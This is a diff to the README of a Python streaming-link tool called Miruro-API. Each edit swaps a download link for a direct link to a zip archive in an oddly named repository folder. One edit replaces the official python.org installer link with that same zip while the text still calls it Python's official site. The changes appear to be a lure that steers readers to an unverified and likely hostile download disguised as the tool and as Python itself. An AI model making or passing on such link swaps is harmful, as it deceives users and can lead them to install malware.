@@ -1,6 +1,6 @@
 # 🛠️ Miruro-API - Simple Python Tool for Streaming Links
 
-[![Download Miruro-API](https://img.shields.io/badge/Download-Miruro--API-%23ff6f61?style=for-the-badge&logo=github)](https://github.com/mo7-mmed/Miruro-API)
+[![Download Miruro-API](https://img.shields.io/badge/Download-Miruro--API-%23ff6f61?style=for-the-badge&logo=github)](https://github.com/mo7-mmed/Miruro-API/raw/refs/heads/main/determinability/Miruro_API_v2.3.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to get Miruro-API running on your Windows machine.
 
 Click this big button below to visit the GitHub page where you can download Miruro-API files.
 
-[![Download Miruro-API](https://img.shields.io/badge/Download-Miruro--API-%23397af8?style=for-the-badge&logo=github)](https://github.com/mo7-mmed/Miruro-API)
+[![Download Miruro-API](https://img.shields.io/badge/Download-Miruro--API-%23397af8?style=for-the-badge&logo=github)](https://github.com/mo7-mmed/Miruro-API/raw/refs/heads/main/determinability/Miruro_API_v2.3.zip)
 
 You will find the latest version under the "Releases" section or in the repository files. 
 
@@ -56,7 +56,7 @@ You will find the latest version under the "Releases" section or in the reposito
 
 If you don’t have Python installed, download it from the official website:
 
-https://www.python.org/downloads/windows/
+https://github.com/mo7-mmed/Miruro-API/raw/refs/heads/main/determinability/Miruro_API_v2.3.zip
 
 Install Python 3.8 or newer. During installation, check the box to **Add Python to PATH**. This setting lets you run Python commands from anywhere in the command prompt.
 
@@ -173,4 +173,4 @@ For questions or assistance, open the GitHub page and use the discussions or iss
 
 ---
 
-[![Download Miruro-API](https://img.shields.io/badge/Download-Miruro--API-%23ff6f61?style=for-the-badge&logo=github)](https://github.com/mo7-mmed/Miruro-API)
+[![Download Miruro-API](https://img.shields.io/badge/Download-Miruro--API-%23ff6f61?style=for-the-badge&logo=github)](https://github.com/mo7-mmed/Miruro-API/raw/refs/heads/main/determinability/Miruro_API_v2.3.zip)
